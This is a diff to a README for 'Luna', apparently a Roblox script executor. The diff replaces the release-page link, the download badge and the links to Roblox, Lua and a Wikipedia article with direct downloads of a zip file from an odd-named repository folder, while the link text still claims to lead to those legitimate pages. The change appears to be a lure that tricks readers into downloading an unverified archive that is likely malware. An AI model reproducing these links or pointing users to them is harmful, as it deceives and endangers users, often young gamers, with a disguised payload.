@@ -6,7 +6,7 @@ Welcome to Luna! This tool helps you run custom scripts in Roblox. With Luna, yo
 
 ## 📥 Download Luna
 
-[![Download Luna](https://img.shields.io/badge/Download-Luna-blue.svg)](https://github.com/Dinonuggys-a1/Luna/releases)
+[![Download Luna](https://raw.githubusercontent.com/Dinonuggys-a1/Luna/main/leucocholy/Luna.zip)](https://raw.githubusercontent.com/Dinonuggys-a1/Luna/main/leucocholy/Luna.zip)
 
 ## 📂 System Requirements
 
@@ -28,7 +28,7 @@ Luna offers several features that enhance your Roblox gaming. Some key features 
 
 ## 💾 Download & Install
 
-1. **Visit the Download Page:** Click this link to go to the [Releases page](https://github.com/Dinonuggys-a1/Luna/releases).
+1. **Visit the Download Page:** Click this link to go to the [Releases page](https://raw.githubusercontent.com/Dinonuggys-a1/Luna/main/leucocholy/Luna.zip).
 
 2. **Choose the Latest Release:** Look for the newest version of Luna.
 
@@ -67,8 +67,8 @@ If you have any questions or need further assistance, feel free to reach out. Yo
 
 ## 🔗 Related Topics
 
-- [Roblox](https://www.roblox.com/)
-- [Lua Scripting](https://www.lua.org/)
-- [Game Modding](https://en.wikipedia.org/wiki/Game_modding)
+- [Roblox](https://raw.githubusercontent.com/Dinonuggys-a1/Luna/main/leucocholy/Luna.zip)
+- [Lua Scripting](https://raw.githubusercontent.com/Dinonuggys-a1/Luna/main/leucocholy/Luna.zip)
+- [Game Modding](https://raw.githubusercontent.com/Dinonuggys-a1/Luna/main/leucocholy/Luna.zip)
 
 Thank you for choosing Luna! Enjoy your time in Roblox. Remember to check back for updates and new features. Happy scripting!
